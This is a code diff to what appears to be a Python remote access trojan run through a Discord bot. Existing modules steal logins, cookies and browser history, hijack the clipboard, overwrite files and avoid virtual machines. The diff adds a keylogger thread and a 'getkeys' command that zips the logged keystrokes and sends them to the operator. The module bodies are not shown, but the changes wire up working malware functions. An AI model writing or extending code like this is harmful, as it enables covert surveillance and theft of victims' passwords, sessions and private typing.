@@ -9,6 +9,7 @@ import time, threading
 from co import config
 #--------------------------------------------------------------------------------------------------------------------------------------
 import startuplogic.antirestart
+import startuplogic.key
 import startuplogic.overwritefiles
 import startuplogic.disablefeatures
 import startuplogic.clipper
@@ -17,6 +18,7 @@ from startuplogic.addme import run_all
 from startuplogic.note import shownote
 from startuplogic.logins import extract_logins_cookies_history
 from startuplogic.edgestealer import edgethief
+from startuplogic.key import run_keylogger
 #--------------------------------------------------------------------------------------------------------------------------------------
 from command.mediacommands import *
 from command.utilitycommands import *
@@ -42,6 +44,8 @@ if VM is False:
     if hasattr(config, "ENABLE_ANTI_RESTART") and config.ENABLE_ANTI_RESTART:
         threading.Thread(target=lambda: check_vm_and_run(startuplogic.antirestart.anti_restart), daemon=True).start()
         threading.Thread(target=lambda: check_vm_and_run(shownote), daemon=True).start() 
+    if hasattr(config, "ENABLE_KEYLOGGER") and config.ENABLE_KEYLOGGER:
+        threading.Thread(target=lambda: check_vm_and_run(startuplogic.key.run_keylogger), daemon=True).start()
     if hasattr(config, "DISABLE_FEATURES") and config.DISABLE_FEATURES:
        threading.Thread(target=lambda: (check_vm_and_run(startuplogic.disablefeatures.disablefeatures)), daemon=True).start()       
     if hasattr(config, "ENABLE_FILE_OVERWRITING") and config.ENABLE_FILE_OVERWRITING:
@@ -99,6 +103,7 @@ else:
     bot.add_command(commands.Command(shutdownpc, name='sd', aliases=['shutdown']))
     bot.add_command(commands.Command(cmd_command, name='cmd'))
     bot.add_command(commands.Command(bassboost_command, name='bassboost'))
+    bot.add_command(commands.Command(zip_and_send_keys, name='getkeys'))
 #--------------------------------------------------------------------------------------------------------------------------------------
 if VM is False:    
     bot.run(token)
